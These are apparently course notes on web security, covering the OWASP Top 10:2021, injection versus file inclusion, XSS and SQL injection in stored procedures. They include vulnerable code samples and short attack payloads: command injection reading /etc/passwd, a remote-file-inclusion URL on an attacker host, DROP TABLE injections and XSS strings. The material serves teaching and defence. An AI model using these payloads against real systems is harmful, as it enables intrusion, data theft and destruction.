# Web Application Security — Session 1 Notes

## 1. OWASP Top 10 – 2021 Overview

The OWASP Top 10:2021 is the globally recognized standard for web application security risks. It lists the **10 most critical security categories** based on real-world data and community surveys.

### Key Changes from 2017

- **Data-driven**: 2021 edition uses CVE/CVSS data across 8 categories + survey feedback for 2 categories.
- **New categories (2021)**: A04 Insecure Design, A08 Software and Data Integrity Failures, A10 Server-Side Request Forgery (SSRF).
- **Merged/renamed**:
  - Cross-Site Scripting (XSS) merged into **A03 Injection**
  - Insecure Deserialization moved into **A08 Software and Data Integrity Failures**
  - XML External Entities (XXE) folded into **A05 Security Misconfiguration**

### The Full List

**A01:2021 – Broken Access Control**

- _What it is_: Failure to enforce proper restrictions on what authenticated users can do (e.g., access other users' data, admin functions).
- _Common examples_: Missing/incorrect authorization checks on APIs or pages; insecure direct object references (IDOR); privilege escalation via tampered parameters.
- _Prevention_: Enforce access control server-side (never trust the client); use RBAC and least privilege; deny by default; log and monitor failed access attempts.

**A02:2021 – Cryptographic Failures**

- _What it is_: Weak or missing cryptography leading to data exposure (formerly "Sensitive Data Exposure").
- _Common examples_: Transmitting data over HTTP instead of HTTPS; weak algorithms (MD5, SHA1, DES) or poor key management; weak password hashing.
- _Prevention_: Use TLS 1.2+ for all sensitive data in transit; use strong, up-to-date algorithms (AES-256, bcrypt/Argon2); implement proper key rotation and secure storage.

**A03:2021 – Injection**

- _What it is_: Untrusted data sent to an interpreter as part of a command/query, leading to unintended execution. Now includes SQLi, NoSQLi, OS command injection, LDAP, and XSS.
- _Common examples_: SQL injection via unsanitized input; command injection via system calls; stored/reflected/DOM-based XSS.
- _Prevention_: Use parameterized queries/prepared statements; validate and sanitize all input (whitelist approach); use frameworks that auto-escape output.

**A04:2021 – Insecure Design** _(New)_

- _What it is_: Flaws in architecture/threat modeling that lead to exploitable weaknesses (not just implementation bugs).
- _Common examples_: No threat modeling during design; weak business logic (e.g., price manipulation, unlimited retries); missing controls for abuse scenarios.
- _Prevention_: Perform threat modeling (e.g., STRIDE) early; define and enforce secure design patterns; write and automate security tests for critical flows.

**A05:2021 – Security Misconfiguration**

- _What it is_: Insecure defaults, incomplete configurations, or exposed services. Now includes XXE.
- _Common examples_: Default accounts/passwords left enabled; verbose error messages revealing stack traces; unnecessary open services/ports; missing security headers.
- _Prevention_: Harden configurations; automate configuration checks (e.g., CIS benchmarks); regularly patch and scan infrastructure.

**A06:2021 – Vulnerable and Outdated Components**

- _What it is_: Using libraries, frameworks, or components with known vulnerabilities.
- _Common examples_: Dependencies with public CVEs (e.g., Log4Shell); outdated web servers, CMS plugins, or JS libraries.
- _Prevention_: Maintain an inventory of components (SBOM); use tools like npm audit, pip-audit, Dependabot, Snyk; remove unused dependencies and patch promptly.

**A07:2021 – Identification and Authentication Failures**

- _What it is_: Weaknesses in verifying user identity and managing sessions.
- _Common examples_: Weak password policies, no MFA; session fixation, predictable session IDs; unmitigated credential stuffing/brute force.
- _Prevention_: Enforce MFA wherever possible; use secure session management (regenerate IDs, timeouts, secure flags); implement account lockout and rate limiting.

**A08:2021 – Software and Data Integrity Failures** _(New)_

- _What it is_: Unsafe assumptions about software updates, critical data, or CI/CD pipelines. Includes insecure deserialization.
- _Common examples_: Deserializing untrusted data without validation; unsigned/unverified code updates or plugins; compromised CI/CD pipelines (dependency confusion).
- _Prevention_: Digitally sign and verify code/artifacts; validate and integrity-check serialized data; secure CI/CD with least privilege, code review, and signed pipelines.

**A09:2021 – Security Logging and Monitoring Failures**

- _What it is_: Inadequate logging, detection, and response, enabling attackers to persist undetected.
- _Common examples_: No logs for auth failures or access control violations; logs not monitored or alert thresholds too high; logs missing key context (who/what/when/source IP).
- _Prevention_: Log all security-relevant events with tamper-proof storage; centralize logs and set up real-time alerting; integrate with incident response processes.

**A10:2021 – Server-Side Request Forgery (SSRF)** _(New)_

- _What it is_: App fetches a remote resource based on a user-supplied URL, allowing access to internal systems.
- _Common examples_: Webhooks, image fetchers, or URL preview features accepting arbitrary URLs; accessing internal metadata services (e.g., `169.254.169.254`).
- _Prevention_: Validate/sanitize URLs; allow only whitelisted schemes/hosts; disable unnecessary protocols (`file://`, `gopher://`); enforce network segmentation and egress controls.

### Quick Mnemonic

> Broken Access, Crypto Fails, Injection, Insecure Design, Misconfiguration, Vulnerable Components, Identification/Auth, Integrity Failures, Logging/Monitoring, SSRF
> → **"BCIIM VIILS"** (or just remember the A01–A10 order).

### How to Use These Notes

- **Theory exams**: Focus on definitions, examples, and 2–3 mitigations per category.
- **Labs/CTFs**: Map each vulnerability to tools (e.g., Burp for access control tests, SQLmap for injection, dependency scanners for A06).
- **Projects**: Use as a checklist during design reviews and code audits.

---

## 2. Injection vs. Inclusion

### Injection – Core Concept

**Definition**: Injection occurs when untrusted input is interpreted as code/commands by an interpreter (SQL engine, shell, template engine, etc.), allowing an attacker to change the intended logic.

**Key idea**: Input → Interpreter → Unexpected execution (data becomes code).

**Common Injection Types**:

- **SQL Injection (SQLi)** — e.g. `SELECT * FROM users WHERE id = '$id'`; if `$id = 1' OR '1'='1`, the query becomes always-true. Impact: data theft, auth bypass, data modification, Remote Code Execution (RCE).
- **Command/OS Injection** — e.g. `system("ping -c 4 " . $_GET['host']);`; if `host = 127.0.0.1; cat /etc/passwd`, an extra command runs. Impact: full server compromise.
- **NoSQL Injection** — e.g. Mongo-style `{"username": {"$ne": null}, "password": {"$ne": null}}`. Impact: bypass auth, extract data.
- **LDAP Injection** — e.g. filter `(uid=*)(|(uid=*))` to alter logic. Impact: auth bypass, info disclosure.
- **Template Injection** — server-side template engines (Jinja2, Twig, Freemarker) executing user input as template code. Impact: RCE, data exfiltration.
- **XPath Injection** — altering XPath queries to bypass checks or extract XML data.
- **XSS as Injection** — in OWASP Top 10:2021, XSS is treated under A03 Injection (data injected into HTML/JS context).

**Generic Injection Pattern**:

1. Find the input point (GET/POST/header/cookie).
2. Identify the interpreter (SQL, shell, template, etc.).
3. Inject syntax-breaking characters (`' " ; | & $ { }`).
4. Observe errors/behavior changes to confirm injection.
5. Escalate: data extraction → auth bypass → command execution.

**Prevention**:

- Parameterization / prepared statements (SQL, LDAP, etc.)
- Avoid building commands/queries with string concatenation.
- Strict input validation (whitelist allowed characters/values).
- Use safe APIs (ORMs, query builders, framework helpers).
- Least privilege for DB/app accounts.
- For templates: never render user input as template code; use data-only contexts.

### Inclusion – Core Concept

**Definition**: Inclusion vulnerabilities occur when a web application includes a file based on user input without proper validation. An attacker may exploit this to read files or execute malicious code.

**Key idea**: Input → File include mechanism → Arbitrary file loaded/executed.

Mainly seen in PHP (`include`, `require`, `include_once`, `require_once`) and similar mechanisms in other languages.

**a) Local File Inclusion (LFI)**

- vulnerability that allows an attacker to include or read files stored on the same server by manipulating user input.
- Vulnerable example:
  ```php
  $page = $_GET['page'];
  include "pages/" . $page;
  ```
- Payload example: `page=../../etc/passwd%00` (null byte trick on older PHP).
- Impact: read sensitive files (`/etc/passwd`, config files, logs); sometimes escalate to RCE via log poisoning or upload + include.

**b) Remote File Inclusion (RFI)**

- vulnerability that allows an attacker to include and execute a file from a remote server. It occurs when an application accepts user input as a filename or URL and includes it without proper validation.
- Vulnerable example: `include $_GET['page'];` with payload `page=http://attacker.com/shell.txt`.
- Impact: attacker's PHP/JS code executed on the server → RCE.

**c) Related Patterns**

- **Path/Directory Traversal**: often combined with inclusion, using `../../` to escape the intended directory.
- **File Disclosure via Include**: including config files, environment files, or backup files (`.bak`, `.old`).

**Typical Inclusion Signatures**:

```php
include($_GET['file']);
require("includes/" . $_POST['page']);
include_once $lang . ".php";
```

Also watch for dynamic `import()` based on user params, or server-side includes (SSI) using user input.

**Prevention**:

- Avoid dynamic includes based on user input.
- If necessary, use a whitelist of allowed values (e.g., map `page=about` → `about.php` internally); never concatenate raw user input into paths.
- Disable dangerous settings: `allow_url_include = Off`, `allow_url_fopen = Off` (if not needed).
- Apply path hardening: use absolute paths; restrict to a specific directory; validate and normalize paths.
- Keep frameworks/libraries updated.

### Injection vs. Inclusion – Quick Contrast

| Aspect            | Injection                          | Inclusion                                          |
| ----------------- | ---------------------------------- | -------------------------------------------------- |
| Core issue        | Untrusted input executed as code   | Untrusted input chooses which file to load/execute |
| Interpreter focus | SQL, shell, template, LDAP, etc.   | File include mechanisms (PHP, SSI, etc.)           |
| Typical result    | Data theft, auth bypass, RCE       | File read (LFI), RCE (RFI), code execution         |
| Common in         | All web apps, APIs, DB-backed apps | PHP apps, legacy apps, custom routers              |
| OWASP mapping     | A03: Injection (Top 10:2021)       | Often under A05 Misconfiguration / custom patterns |

---

## 3. Cross-Site Scripting (XSS)

**Definition**: Cross-Site Scripting (XSS) is a web vulnerability where an attacker injects malicious JavaScript into a web page. When another user's browser loads the page, the script executes in their browser, not on the server.

- Remember: XSS executes code on the client (browser), while RCE executes code on the server. In OWASP Top 10:2021, XSS is categorized under **A03 – Injection**.

### Core Idea

- The application takes untrusted input and includes it in the HTML/JS response without proper encoding or validation.
- The browser trusts the page's origin and executes the injected script as if it came from the legitimate site.
- Result: the attacker can run arbitrary JS in the victim's browser under the site's origin.

### Types of XSS

**A) Reflected XSS (Non-Persistent)**

- The payload is part of the request (e.g., query parameter) and immediately reflected in the response. The victim must click a crafted link or submit a form.
- Example flow: attacker sends `https://site.com/search?q=<script>alert(1)</script>`; server returns `Results for <script>alert(1)</script>`; victim's browser executes the script.
- Characteristics: not stored on the server; requires social engineering (phishing link); common in search bars, error messages, or any parameter echoed back.

**B) Stored XSS (Persistent)**

- The payload is stored on the server (DB, file, comments, profile, etc.) and served to victims later. No special link is needed — the victim just visits a normal page.
- Example: attacker posts a comment containing `<script>stealCookie()</script>`; every user viewing that comment executes the script.
- Characteristics: more dangerous (affects many users automatically); found in comments, forums, usernames, product reviews, ticket systems.

**C) DOM-based XSS**

- The vulnerability exists in client-side JavaScript that manipulates the DOM using unsafe sources (e.g., `location`, `document.URL`, `innerHTML`). The server may not reflect the payload in HTML at all — the browser-side script constructs the dangerous HTML/JS.
- Example pattern:
  ```js
  var name = location.hash.substring(1);
  document.getElementById("welcome").innerHTML = "Hello, " + name;
  ```
  Payload in URL: `#<img src=x onerror=alert(1)>`
- Characteristics: often invisible to server-side scanners; depends on how front-end code handles input; common in single-page apps (SPAs) and heavy JS frameworks when misused.

### Impact of XSS

- Session hijacking: stealing cookies/tokens (`document.cookie`) and sending them to the attacker.
- Credential theft: fake login forms, keyloggers.
- Defacement: modifying page content.
- Malware delivery: redirects to malicious sites, drive-by downloads.
- Actions on behalf of the user: performing requests using the victim's session.
- Combined with other bugs: account takeover, data exfiltration, internal network scanning from the victim's browser.

### Common Injection Contexts

Where the payload ends up determines how it must be written:

- **Inside HTML element content**: `Hello, <span>USER_INPUT</span>` → payload `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
- **Inside attribute value**: `<input value="USER_INPUT">` → payload `" onfocus="alert(1)" autofocus="`
- **Inside JavaScript string**: `var user = "USER_INPUT";` → payload `"; alert(1); //`
- **Inside URL/location**: `<a href="USER_INPUT">Click</a>` → payload `javascript:alert(1)`
- **Inside JSON/JS context**: breaking out of strings/objects to inject script.

### Prevention

**A) Output Encoding / Escaping**

- Encode data based on context before inserting into HTML:
  - HTML body: `&`, `<`, `>`, `"`, `'` → `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`
  - Attributes: same plus ensure quotes around attribute values.
  - JavaScript: avoid inserting raw data into script blocks; use data attributes and read via JS.
  - URLs: validate scheme (`http`, `https`) and encode appropriately.
- Use framework features: React, Angular, and Vue auto-escape by default when using bindings (`{{ }}`, `{ }`, JSX). Avoid `dangerouslySetInnerHTML`, `v-html`, and `innerHTML` with untrusted data.

**B) Input Validation**

- Whitelist allowed characters/values where possible.
- For rich text (comments, posts), use a sanitization library (e.g., DOMPurify) to strip/neutralize dangerous tags/attributes.

**C) Content Security Policy (CSP)**

- HTTP header to restrict sources of scripts, e.g. `Content-Security-Policy: default-src 'self'; script-src 'self'`.
- Mitigates the impact of XSS by blocking inline scripts and unauthorized domains. Not a replacement for encoding, but strong defense-in-depth.

**D) HTTP-only & Secure Cookies**

- Mark session cookies as `HttpOnly` (not accessible via `document.cookie`), `Secure` (only over HTTPS), and `SameSite` (restricts cross-site sending). This reduces damage if XSS is present.

### XSS vs. Other Vulnerabilities

- **XSS vs. CSRF**: XSS runs a script in the victim's browser under the target origin; CSRF forces the victim's browser to send requests to the target site with no script execution needed. XSS can be used to bypass CSRF protections.
- **XSS vs. Injection (SQLi, etc.)**: XSS targets the client side (browser, users); SQLi and command injection target the server side (DB, OS).

---

## 4. Injection in Stored Procedures

### What Is a Stored Procedure?

A stored procedure is precompiled SQL code stored in the database server (e.g., SQL Server, MySQL, PostgreSQL, Oracle). It can accept parameters, contain multiple SQL statements, loops, and conditionals, and dynamic SQL. It's often used to encapsulate business logic and improve performance/security.

### How SQL Injection Can Occur in Stored Procedures

A common assumption is: "If I use stored procedures, I'm safe from SQL injection." **This is false.** Injection can still happen if:

- The procedure builds dynamic SQL strings using concatenated user input.
- Parameters are passed unsafely into `EXEC`, `EXECUTE IMMEDIATE`, `sp_executesql`, etc.
- Input is used to construct object names (table/column names) that cannot be parameterized directly.

**Core idea**: If user input becomes part of the SQL text that the DB executes, injection is possible.

### Vulnerable Pattern Examples

**a) SQL Server (T-SQL) – Dynamic SQL with Concatenation**

```sql
CREATE PROCEDURE GetUser @userName NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX);
    SET @sql = 'SELECT * FROM Users WHERE UserName = ''' + @userName + '''';
    EXEC(@sql);
END;
```

- If `@userName = admin'--`, the query becomes `SELECT * FROM Users WHERE UserName = 'admin'--'` (comments out the rest, bypassing logic).
- If `@userName = admin'; DROP TABLE Users; --`, additional statements may execute if allowed.
- **Problem**: user input is concatenated directly into the SQL string.

**b) MySQL – Dynamic SQL in Procedure**

```sql
CREATE PROCEDURE GetProduct(IN prod_name VARCHAR(255))
BEGIN
    SET @sql = CONCAT('SELECT * FROM products WHERE name = ''', prod_name, '''');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END;
```

- If `prod_name = test' OR '1'='1`, the query becomes `SELECT * FROM products WHERE name = 'test' OR '1'='1'`, returning all rows.

**c) Using Input for Object Names**
Some things cannot be parameterized (e.g., table/column names):

```sql
CREATE PROCEDURE GetData @tableName NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX);
    SET @sql = 'SELECT * FROM ' + @tableName;
    EXEC(@sql);
END;
```

- If `@tableName = Users; DROP TABLE Logs; --`, this can lead to destructive queries.

### Why Stored Procedures Are Often "Safer" (But Not Automatically)

Stored procedures help when:

- Parameters are used properly (no string concatenation).
- All queries inside are static SQL with parameter placeholders.
- Permissions are restricted (the procedure runs with limited rights).

They do **not** protect you if:

- You build dynamic SQL inside the procedure using raw input.
- You don't validate/sanitize parameters used for object names.
- You call procedures with concatenated values from the application layer.

### Secure Patterns – How to Avoid Injection

**a) Use Parameterized Queries Inside Procedures**

```sql
CREATE PROCEDURE GetUser @userName NVARCHAR(50)
AS
BEGIN
    SELECT *
    FROM Users
    WHERE UserName = @userName;  -- Parameter used directly, no concatenation
END;
```

The DB treats `@userName` as data, not code — no dynamic SQL means no injection via this path.

**b) Use `sp_executesql` with Parameters (SQL Server)**
When dynamic SQL is truly needed:

```sql
CREATE PROCEDURE GetUser @userName NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX);
    SET @sql = N'SELECT * FROM Users WHERE UserName = @u';

    EXEC sp_executesql
        @sql,
        N'@u NVARCHAR(50)',
        @u = @userName;
END;
```

The query text is parameterized; `@userName` is passed as a parameter to `sp_executesql`, preventing injection even with dynamic SQL.

**c) Validate and Whitelist Object Names**

```sql
CREATE PROCEDURE GetData @tableName NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(MAX);

    -- Whitelist allowed tables
    IF @tableName NOT IN ('Users', 'Orders', 'Products')
    BEGIN
        RAISERROR('Invalid table name', 16, 1);
        RETURN;
    END

    SET @sql = 'SELECT * FROM ' + QUOTENAME(@tableName);
    EXEC(@sql);
END;
```

Use whitelisting of allowed values and built-in functions like `QUOTENAME()` (SQL Server) to safely delimit identifiers.

**d) Least Privilege for Procedure Execution**

- Create a dedicated DB user for the app.
- Grant `EXECUTE` on specific stored procedures only — no direct `SELECT/INSERT/UPDATE/DELETE` on tables.
- Ensure the procedure runs with minimal required permissions.
- Avoid `EXECUTE AS OWNER` with highly privileged accounts unless necessary and well-controlled.

### Application-Side Mistakes That Still Cause Injection

Even with stored procedures, bad app code can reintroduce injection.

Vulnerable (app builds SQL that calls the procedure):

```python
query = f"EXEC GetUser '{user_input}'"
cursor.execute(query)
```

Better — use parameterized calls from the app:

```python
cursor.execute("EXEC GetUser @userName = ?", (user_input,))
```

(or the equivalent in your language/driver).

### Key Points for Exams / Audits

- Stored procedures ≠ automatic protection from SQL injection.
- Look for: dynamic SQL inside procedures (`EXEC`, `EXECUTE IMMEDIATE`, `PREPARE/EXECUTE`); string concatenation with parameters; use of input for table/column names.
- Secure patterns: static SQL with parameters; parameterized dynamic SQL (`sp_executesql` with param list); whitelisting + safe identifier functions for object names; least privilege for DB accounts and procedure owners.

### One-Line Rule

> If any user input becomes part of the SQL string (via concatenation) inside a stored procedure, you have potential SQL injection — regardless of using stored procedures.
